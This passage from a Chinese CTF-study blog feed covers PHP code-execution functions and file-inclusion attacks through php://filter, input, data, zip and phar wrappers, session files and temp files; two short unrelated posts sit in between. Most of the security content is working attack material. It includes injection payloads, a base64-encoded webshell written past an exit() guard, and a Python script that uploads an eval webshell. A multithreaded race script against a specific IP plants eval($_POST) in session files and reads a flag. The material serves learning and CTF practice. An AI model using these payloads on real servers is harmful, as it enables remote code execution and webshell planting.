<h1 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h1><h2 id="危险函数-1"><a href="#危险函数-1" class="headerlink" title="危险函数"></a>危险函数</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><p>严格来说,php中eval()不是函数,而是一个语言结构,所以无法变量函数(可变函数)函数的方式调用.<br>效果:将括号内的作为php代码执行.<br><a href="https://shuimao.xyz/2023/03/13/PHP%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/#%E5%87%BD%E6%95%B0">变量函数参考</a></p>
<h3 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h3><p>如果括号内是字符串将会当成php代码执行<br>注意:在php7.2之前,assert()是一个函数,可以使用变量(可变)函数调用.在此之后assert也同eval,是语言解构而不是函数.</p>
<h3 id="preg-replace-参1-参2-参3-x2F-e"><a href="#preg-replace-参1-参2-参3-x2F-e" class="headerlink" title="preg_replace(参1,参2,参3)+&#x2F;e"></a>preg_replace(参1,参2,参3)+&#x2F;e</h3><p>执行一个正则表达式的搜索和替换,注意,php7.0之后,不再支持&#x2F;e模式</p>
<ol>
<li><strong>效果</strong>:<br>搜索参数3中是否有参数1,如果有则用参数2进行替换</li>
<li><strong>&#x2F;e模式</strong>:<br>&#x2F;e模式下,可能会导致代码执行漏洞,将参数1写成<code>/参数1/e</code>的形式,如果发生了替换,参数2就会被当成php代码,最后替换成代码执行后的结果<br>例如:<code>preg_replace($_GET[a],$_GET[b],$_GET[c])</code><br>payload:<code>?a=/hello/e&amp;b=phpinfo()&amp;c=hello world</code>  &#x2F;&#x2F;替换时会执行phpinfo</li>
</ol>
<h3 id="create-function-参1-参2"><a href="#create-function-参1-参2" class="headerlink" title="create_function(参1,参2)"></a>create_function(参1,参2)</h3><ol>
<li><strong>函数作用</strong><br>根据传递的参数创建匿名函数，并为其返回唯一名称。参1声明函数的变量部分,参2是执行的方法代码部分<br>简单来说,这个函数就是类似于function一个函数,函数1就是这个函数里面的变量,参数二的部分会被当做function函数内的代码执行</li>
<li><strong>利用函数执行代码</strong><br>其实感觉原理和sql注入有点像,先将前面的语句闭合,再写入想要执行的代码,最后将后面的语句注释<br>前提是,参数二是用变量拼接的,如<code>$c=&#39;echo &#39;.&#39;($s&#39;.&#39;+&#39;.&quot;$a)&quot;.&#39;;&#39;;</code><br>例如,$a,$b是_GET传参的<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[a];</span><br><span class="line"><span class="variable">$c</span>=<span class="string">&#x27;echo &#x27;</span>.<span class="string">&#x27;($s&#x27;</span>.<span class="string">&#x27;+&#x27;</span>.<span class="string">&quot;<span class="subst">$a</span>)&quot;</span>.<span class="string">&#x27;;&#x27;</span>;</span><br><span class="line"><span class="variable">$New</span>=<span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$s&#x27;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$New</span>(<span class="number">100</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
实际效果:<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">New</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="number">100</span>+<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
那我们构造一个payload:<code>?a=888);&#125;phpinfo();/*</code><br>原函数变成:<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">new</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="number">100</span>+<span class="number">888</span>);&#125;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    <span class="comment">/*);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="array-map-参1-参2"><a href="#array-map-参1-参2" class="headerlink" title="array_map(参1,参2)"></a>array_map(参1,参2)</h3><p>为数组的每个元素应用回调函数<br>参数1为回调函数(可以是自己定义的,也可以是php自带的),参数2是一个数组,每个元素将会被作为命令放在回调函数里执行<br>例如:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$array</span>[<span class="number">0</span>]=<span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;system&#x27;</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="call-user-func-参1-参2"><a href="#call-user-func-参1-参2" class="headerlink" title="call_user_func(参1,参2)"></a>call_user_func(参1,参2)</h3><p>和array_map()相似,参数1为回调函数,参数2是一个变量,作为回调函数的参数或命令<br>再给个例子payload&#x3D;<code>?a=phpinfo()</code> </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(assert,<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]); </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<h3 id="call-user-func-array-参数1-参数2"><a href="#call-user-func-array-参数1-参数2" class="headerlink" title="call_user_func_array(参数1,参数2)"></a>call_user_func_array(参数1,参数2)</h3><p>和array_map()相似,参数1是回调函数,参数2为数组</p>
<h3 id="array-filter-参数1-参数2"><a href="#array-filter-参数1-参数2" class="headerlink" title="array_filter(参数1,参数2)"></a>array_filter(参数1,参数2)</h3><p>使用回调函数过滤数组的元素<br>参数1是一个数组,参数2是回调函数</p>
<h3 id="usort"><a href="#usort" class="headerlink" title="usort()"></a>usort()</h3><p>使用用户自定义的比较函数对数组中的值进行排序<br>先贴一个别人的,有点没看懂</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php环境&gt;=<span class="number">5.6</span>才能用</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">usort</span>(...<span class="variable">$_GET</span>);<span class="meta">?&gt;</span></span><br><span class="line">利用方式：</span><br><span class="line">test.php?<span class="number">1</span>[]=<span class="number">1</span>-<span class="number">1</span>&amp;<span class="number">1</span>[]=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>])&amp;<span class="number">2</span>=assert</span><br><span class="line">[POST]:x=<span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">php环境&gt;=&lt;<span class="number">5.6</span>才能用</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">usort</span>(<span class="variable">$_GET</span>,<span class="string">&#x27;asse&#x27;</span>.<span class="string">&#x27;rt&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line">利用方式：</span><br><span class="line">test.php?<span class="number">1</span>=<span class="number">1</span>+<span class="number">1</span>&amp;<span class="number">2</span>=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[x])</span><br><span class="line">[POST]:x=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>
<h3 id="uasort"><a href="#uasort" class="headerlink" title="uasort()"></a>uasort()</h3><p>使用用户定义的比较函数对数组进行排序并保持索引关联</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Rce</tag>
        <tag>命令执行与代码执行</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>第一篇博客</title>
    <url>/2023/03/09/%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<h1 id="欢迎来到睡猫的博客"><a href="#欢迎来到睡猫的博客" class="headerlink" title="欢迎来到睡猫的博客"></a><center>欢迎来到睡猫的博客</center></h1>]]></content>
      <categories>
        <category>Others</category>
      </categories>
  </entry>
  <entry>
    <title>试着练习一下markdown</title>
    <url>/2023/03/10/%E8%AF%95%E7%9D%80%E7%BB%83%E4%B9%A0%E4%B8%80%E4%B8%8Bmarkdown/</url>
    <content><![CDATA[<h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4><h5 id="五级标题"><a href="#五级标题" class="headerlink" title="五级标题"></a>五级标题</h5><h6 id="六级标题"><a href="#六级标题" class="headerlink" title="六级标题"></a>六级标题</h6><p><em>斜体</em> 一个*<br><strong>粗体</strong> 两个*<br><em><strong>又斜又粗</strong></em> 三个*</p>
<p>一句话两个空格换行  两句话之间一个空格换行</p>
<p>用&lt;br&#x2F;&gt;也能换行<br><br/></p>
<blockquote>
<p>试一下引用<br>换行不会结束引用</p>
</blockquote>
<p>用一个空白行结束了上面的引用</p>
<p><a href="https://zhm666666.github.io/">试一下连接</a><br>主页<a href="https://zhm666666.github.io/">https://zhm666666.github.io</a></p>
<p>图片练习先放着</p>
<hr>
<p>列表</p>
<ul>
<li>无序列表 1</li>
<li>无序列表 2<ul>
<li>无序列表 2.1</li>
<li>无序列表 2.2</li>
</ul>
</li>
</ul>
<ol>
<li>有序列表 1<br> 1.1 有序列表 1.1</li>
<li>有序列表 2<br> 2.1 有序列表2.1</li>
</ol>
<p><del>删除线</del>用~~<br><u>下划线</u> 用&lt;u&gt;<br><code>hello world</code> 用反引号&#96;</p>
<p>一串代码块</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;HelloWorld&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Others</category>
      </categories>
  </entry>
  <entry>
    <title>试一下图片的上传</title>
    <url>/2023/03/11/%E8%AF%95%E4%B8%80%E4%B8%8B%E5%9B%BE%E7%89%87%E7%9A%84%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<p>今天给图片创建了一个<strong>图床</strong><br>试试能不能正常的上传图片<br><del>正好有个朋友在垃圾桶捡到了个木头</del></p>
<hr>
<h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/%E5%9E%83%E5%9C%BE%E6%A1%B6%E6%9C%A8%E5%A4%B4.jpg" alt="勉强看一下"></h2><p>#####PS<br>为了这个破木头搞了一晚上，最后只能租了个阿里云<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230311225041.jpg" alt="救命"></p>
]]></content>
      <categories>
        <category>Others</category>
      </categories>
  </entry>
  <entry>
    <title>文件包含漏洞的学习</title>
    <url>/2023/05/04/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>所谓文件包含漏洞就是指,后端代码使用了一些文件包含的函数,如果用户能控制这些函数的参数,就可以实现<strong>任意代码读取</strong>,<strong>getshell</strong>,<strong>命令执行</strong>等多种攻击手段<br>文件包含漏洞可以简单的分为<strong>本地文件包含</strong>和<strong>远程文件包含</strong>,本质上没有区别,开发人员应该尽可能的避免用户控制文件包含函数的参数,或是进行严格的过滤</p>
<h2 id="php各种伪协议的利用"><a href="#php各种伪协议的利用" class="headerlink" title="php各种伪协议的利用"></a>php各种伪协议的利用</h2><ol>
<li><p><strong>什么是php的伪协议</strong><br>PHP伪协议是指PHP支持的一些特殊的协议，它们可以用来访问各种<code>输入/输出流</code>、内存中的临时文件流以及其他读取写入文件资源的过滤器。PHP支持多种伪协议，包括 <code>file://、http://、ftp://、php://、zlib://、data://、glob://、phar://、ssh2://、rar:// 和 ogg:// </code>等。</p>
</li>
<li><p><strong>伪协议的安全问题</strong><br>伪协议通常配合文件包含漏洞一起利用。文件包含的函数有<code>include()</code>, <code>include_once()</code>,<code>require()</code>,<code>require_once()</code>等等.文件包含本身存在的问题是,无论包含的是什么后缀的文件,都会被当成php文件解析,这在<a href="https://shuimao.xyz/2023/04/04/Upload%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#%E5%9B%BE%E7%89%87%E9%A9%AC">文件上传</a>中已经有利用过,如果我们能控制文件包含函数的参数,配合伪协议,能实现更多攻击手段</p>
</li>
<li><p><strong>可以利用的伪协议</strong><br>下面介绍六种可能会导致安全问题的伪协议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter</span><br><span class="line">php://input</span><br><span class="line">file:// </span><br><span class="line">data:// </span><br><span class="line">zip:// </span><br><span class="line">phar:// </span><br></pre></td></tr></table></figure>
<p>可能导致文件包含的函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include和require函数</span><br><span class="line">include和include_once</span><br><span class="line">highlight_file()和show_source()</span><br><span class="line">readfile和file_get_contents和file</span><br><span class="line">file_put_contents</span><br><span class="line">fopen</span><br></pre></td></tr></table></figure>
<p>使用PHP伪协议可能会导致安全风险，因此应谨慎使用。为了防止潜在的安全威胁，可以将<code>allow_url_include</code>配置选项设置为<code>off</code>，这样就限制无法包含远程文件了,需要注意的是，从<code>PHP5.2</code>开始,allow_url_include默认为Off。</p>
<p><code>allow_url_fopen</code>是一个PHP配置选项，它控制PHP是否可以使用文件函数（如fopen，file_get_contents和include 来访问URL对象（如HTTP和FTP资源）。allow_url_fopen默认都是on。</p>
</li>
</ol>
<h3 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p>php:&#x2F;&#x2F;filter是一种元封装器，是PHP中特有的协议流，设计用于数据流打开时的筛选过滤应用，作用是作为一个“中间流”来处理其他流。简单来说,就是作为一个中间的代理,将读入或者写入的数据按照规定参数进行过滤或处理后输出<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230505160603.png"><br>第四点告诉了我们其实<code>read</code>和<code>write</code>是可以省略的<br>我们可以通过不同参数对读入写入的数据进行不同的处理,这里介绍几个可能导致危险的参数</p>
<ol>
<li><p><strong>convert.base64-encode</strong><br>作用是对数据流进行<code>base64</code>编码,如果不对数据进行编码的话,那所包含的文件就会被当成代码执行,不会输出结果,但编码后,就可以对任意文件进行读取,可以通过这个方式读取源码,然后进一步白盒审计<br>payload:  <code>php://filter/read=convert.base64-encode/resource=index.php</code></p>
</li>
<li><p><strong>convert.base64-decode</strong><br>作用是对数据流<code>base64</code>解码,利用这个过滤器,可以实现对<strong>死亡exit</strong>的绕过<br>死亡exit指的是在进行写入PHP文件操作时，执行了类似以下函数<br><code>file_put_contents($content, &#39;&lt;?php exit();&#39; . $content);</code><br>这样一来无论我们想要写入什么内容,都会在开头被拼接插上<code>exit()</code>,导致强行终止<br>为什么使用base64解码可以绕过呢,base64只能识别64个可打印字符(大写字母,小写字母,数字,加号(+)和斜杠(&#x2F;)),遇到其他不属于base64字符集的字符时,会跳过这些字符,而不是停止解码<br>例如被插入了<code>&lt;?php exit()?&gt;</code>,解码只能识别其中的<code>phpexit</code>,其他会被跳过<br>因为base64解码是四个字符为一组进行解码,所以我们只需要将前面无用的内容凑出四的倍数,比如<code>phpexito</code>再将已经编码好的一句话木马写在后面,这样进行解码的时候就会将前面的死亡exit绕过,同时解码一句话木马<br>pyload:<br><code>txt=QPD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8%2B&amp;filename=php://filter/write=convert.base64-decode/resource=shell.php</code></p>
</li>
<li><p><strong>string.strip_tags</strong><br>用来处理掉读入的所有标签，例如XML,HTML注释和PHP标签也会被去除。(PHP4, PHP5, PHP7)（自PHP7.3.0起已弃用此功能。）<br>由于<code>&lt;?php exit; ?&gt;</code>,实际上这是一个XML标签,所以我们可以通过string.strip_tags过滤器将这个死亡exit去除,但是我们要写入的一句话木马也会被去除,所以我们可以先将一句话木马进行编码,利用过滤器可以叠加的特性,先去除死亡exit,再将一句话木马还原<br>payload:<br><code>php://filter/string.strip_tags|convert.base64-decode/resource=shell.php</code></p>
</li>
</ol>
<h3 id="php-x2F-x2F-input-伪协议"><a href="#php-x2F-x2F-input-伪协议" class="headerlink" title="php:&#x2F;&#x2F;input 伪协议"></a>php:&#x2F;&#x2F;input 伪协议</h3><p>条件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">allow_url_fopen: on/off</span><br><span class="line">allow_url_include: on</span><br></pre></td></tr></table></figure>
<p>php:&#x2F;&#x2F;input是一个可以访问请求的原始数据的只读流。它可以读取POST请求的参数<br>简单来说,它与使用$_POST变量来获取POST参数类似，但是php:&#x2F;&#x2F;input提供了更多的灵活性。<br>例如使用eval()函数来执行从php:&#x2F;&#x2F;input获取的数据,就可以导致任意代码执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>在上面的代码中，攻击者可以使用如下 URL 来执行恶意代码：<br><code>http://www.example.com/index.php?file=php://input</code><br>当用户访问上面的 URL 时，服务器会读取请求正文中的数据，并将其作为PHP代码执行。因此，攻击者可以在请求正文中发送恶意代码，从而在服务器上执行任意命令。</p>
<h3 id="file-x2F-x2F-伪协议"><a href="#file-x2F-x2F-伪协议" class="headerlink" title="file:&#x2F;&#x2F; 伪协议"></a>file:&#x2F;&#x2F; 伪协议</h3><p>用于访问本地文件系统,允许攻击者读取本地文件系统中的文件。这个伪协议通常用于读取敏感文件，例如配置文件或数据库凭据。需要注意的是,<code>file://</code> 后面必须跟着是本地的绝对路径,不允许是相对路径,或是远程文件</p>
<h3 id="data-x2F-x2F-伪协议"><a href="#data-x2F-x2F-伪协议" class="headerlink" title="data:&#x2F;&#x2F; 伪协议"></a>data:&#x2F;&#x2F; 伪协议</h3><p>条件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">allow_url_fopen: on</span><br><span class="line">allow_url_include: on</span><br></pre></td></tr></table></figure>
<p>data:&#x2F;&#x2F;伪协议是数据流封装器，传递相应格式的数据<br><code>data://</code> 伪协议的语法如下：<br><code>data:[&lt;mediatype&gt;][;base64],&lt;data&gt;</code><br>如果使用include()或require()函数来包含从用户输入中获取的<code>data://</code>， 通常可以用来执行PHP代码。<br>payload:<br><code>?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</code><br><code>?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></p>
<h3 id="zip-x2F-x2F-伪协议"><a href="#zip-x2F-x2F-伪协议" class="headerlink" title="zip:&#x2F;&#x2F; 伪协议"></a>zip:&#x2F;&#x2F; 伪协议</h3><p><code>zip://</code>伪协议属于压缩流，可以访问压缩文件中的子文件(相同的类型的还有<code>zlib://</code>和<code>bzip2://</code>)<br>语法  <code>zip:// [压缩文件绝对路径] # [压缩文件内的子文件名]</code><br>例如  有一个<code>myzip.zip</code>的压缩文件，其中包含一个名为<code>myfile.txt</code>的文件，可以使用以下语法访问该文件：<code>zip://myzip.zip#myfile.txt</code>(要是在URL中<code>#</code>要写成<code>%23</code>)<br>此外这个伪协议也可以配合文件上传漏洞使用,如果攻击者能够上传一个包含恶意PHP代码的zip文件，并且能够控制包含函数的参数，那么他们就可以使用zip:&#x2F;&#x2F;伪协议来执行恶意代码。<br><strong>payload</strong><br><code>?file=zip://evil.zip#shell.php</code><br>注意 这个伪协议对后缀不敏感,所以可以将先将文件压缩为zip,再将后缀改成jpg,然后<br><code>?file=zip://evil.jpg#shell.php</code></p>
<h3 id="phar-x2F-x2F-伪协议"><a href="#phar-x2F-x2F-伪协议" class="headerlink" title="phar:&#x2F;&#x2F; 伪协议"></a>phar:&#x2F;&#x2F; 伪协议</h3><p><code>phar://</code>伪协议和<code>zip://</code>伪协议类似,phar本身就是php中压缩文件的一种形式,所以可以通过phar:&#x2F;&#x2F;访问zip压缩文件中的子文件(注:php版本大于等于5.3.0，压缩包只能是zip协议压缩)<br>语法  <code>phar:// [压缩文件绝对路径] / [压缩文件内的子文件名]</code><br><strong>payload</strong><br><code>?file=phar://evil.zip/shell.php</code></p>
<p>更重要的是,phar:&#x2F;&#x2F;伪协议可以配合<strong>反序列化漏洞</strong>,用伪协议配合一些危险函数可以触发phar文件中的元数据的反序列化<a href="https://shuimao.xyz/2023/04/23/%E5%AD%A6%E4%B9%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">phar反序列化漏洞</a></p>
<h2 id="临时文件包含"><a href="#临时文件包含" class="headerlink" title="临时文件包含"></a>临时文件包含</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/string.strip_tags/resource=/etc/passwd</span><br><span class="line">版本要求：</span><br><span class="line">php7.0.0-7.1.2</span><br><span class="line">php7.1.3-7.2.1</span><br><span class="line">php7.2.2-7.2.8</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">版本要求：</span><br><span class="line">php&lt;=5.6.38</span><br><span class="line">php7.0.0-7.0.32</span><br><span class="line">php7.0.4-7.2.12</span><br></pre></td></tr></table></figure>
<ol>
<li><strong>什么是临时文件</strong><br>临时文件是计算机系统在执行某些操作时创建的文件，用于存储临时数据。这些文件通常在操作完成后被删除，但有时它们可能会遗留在系统中。<br>一般认为，上传文件需要对应的功能点，但实际上，无论是否有文件上传的功能点，只要HTTP请求中存在文件，那么就会被保存为临时文件，当前HTTP请求处理完成后，垃圾回收机制会自动删除临时文件。</li>
<li><strong>怎么利用</strong><br>临时文件的存储位置取决于操作系统和应用程序。在Windows操作系统中，临时文件通常存储在<code>C:\Windows\Temp</code>和<code>C:\Users\[用户名]\AppData\Local\Temp</code>目录下。在Linux和macOS操作系统中，临时文件通常存储在<code>/tmp</code>目录下,如果我们能知道文件最后保存的名字,就可以配合文件包含功能,上传我们想要的代码.<br>php7 segment fault特性：如果我们向后端发送大量文件,就会导致php崩溃,这时最后发送的文件就会被保留在临时文件中,我们利用文件包含漏洞包含这个临时文件,就可以实现这个文件的代码<br><strong>payload:</strong><br><code>?file=php://filter/string.strip_tags/resource=/etc/passwd</code><br>python脚本<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> res</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line">url=<span class="string">&quot;具有文件包含漏洞的网址?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">phpfile=<span class="string">&quot;&lt;?php  @eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot;</span>   <span class="comment">#phpfile对应的就是上传的文件的内容</span></span><br><span class="line">filedata=&#123;</span><br><span class="line">    <span class="string">&quot;file&quot;</span>:phpfile</span><br><span class="line">&#125;</span><br><span class="line">bak=res.post(url=url,files=filedata)</span><br><span class="line"><span class="built_in">print</span>(bak.text)  <span class="comment">#最后输出网站奔溃,说明临时文件保存成功</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a>session文件包含</h2><p>Session 文件包含漏洞是一种利用条件竞争漏洞的攻击方法。它利用了服务器在处理文件上传时，可能会执行恶意代码的漏洞。攻击者可以通过控制 session 文件中的内容，传入恶意代码，然后通过文件包含漏洞来执行恶意代码。为了成功利用这个漏洞，需要知道服务器存储<code>session文件的存储位置</code>和<code>文件名格式</code>。<br>与session文件包含有关的配置,以及默认情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session.save_path：</span><br><span class="line">默认情况下，可能设置为系统的临时目录，例如 Linux/Unix 系统上的 /tmp 目录。(我们可以采用phpinfo()来查看)</span><br><span class="line"></span><br><span class="line">session.name：默认值为 PHPSESSID,配置选项用于定义表单中用于报告上传进度的字段的名称,最大的好处是，它的值可控。</span><br><span class="line"></span><br><span class="line">session.upload_progress.cleanup:  默认为on,开启后 PHP 在文件上传结束后立即清空对应会话文件中的内容。(如果这个选项为on,意味着我们需要条件竞争)</span><br><span class="line"></span><br><span class="line">session.cookie_secure：默认值为 0，表示会话 cookie 可以通过非安全连接（如 HTTP）传输。</span><br><span class="line"></span><br><span class="line">session.use_only_cookies：默认值为 1，表示仅使用 cookie 来存储会话 ID。</span><br><span class="line"></span><br><span class="line">session.auto_start:  </span><br><span class="line">默认情况下，这个选项都是关闭的。开启后则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。</span><br><span class="line"></span><br><span class="line">session.use_strict_mode：</span><br><span class="line">默认值为 0，设置为 0 以允许用户自定义会话 ID。例如，用户可以在 cookie 中设置 PHPSESSID=TGAO，则 PHP 将在服务器上创建一个名为 /tmp/sess_TGAO 的文件。即使用户没有初始化会话，PHP 也会自动初始化会话。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>放一个别人写的多线程python脚本,<a href="https://www.cnblogs.com/TTaly/p/16934584.html">原文连接</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line">parameter = <span class="string">&quot;QAQ&quot;</span>  <span class="comment"># 参数名称</span></span><br><span class="line">url = <span class="string">&quot;http://43.143.7.97:28098/&quot;</span>  <span class="comment"># 修改url地址</span></span><br><span class="line">catalogue = <span class="string">&quot;/tmp&quot;</span>  <span class="comment"># 存放session文件的目录</span></span><br><span class="line">data = &#123;<span class="string">&quot;aaa&quot;</span>: <span class="string">&quot;system(&#x27;cat /var/ffflllaaagggflag&#x27;);&quot;</span>&#125;  <span class="comment"># 执行的命令</span></span><br><span class="line">filename = <span class="string">&quot;test.txt&quot;</span>  <span class="comment"># 上传的文件名  要上传文件 它会携带者PHP_SESSION_UPLOAD_PROGRESS发送  而且会存储到sess_id文件里面</span></span><br><span class="line">sess_id = <span class="string">&quot;abc&quot;</span>  <span class="comment"># sess拼接的文件名</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        data = &#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;sess_id&#125;</span>&lt;?php eval($_POST[aaa]);?&gt;<span class="subst">&#123;sess_id&#125;</span>&quot;</span>&#125;</span><br><span class="line">        cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: sess_id&#125;</span><br><span class="line">        files = &#123;<span class="string">&quot;file&quot;</span>: (filename, f)&#125;</span><br><span class="line">        session.post(url=url, data=data, cookies=cookies, files=files)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(url=<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?<span class="subst">&#123;parameter&#125;</span>=<span class="subst">&#123;catalogue&#125;</span>/sess_<span class="subst">&#123;sess_id&#125;</span>&quot;</span>, data=data)</span><br><span class="line">        <span class="keyword">if</span> filename <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

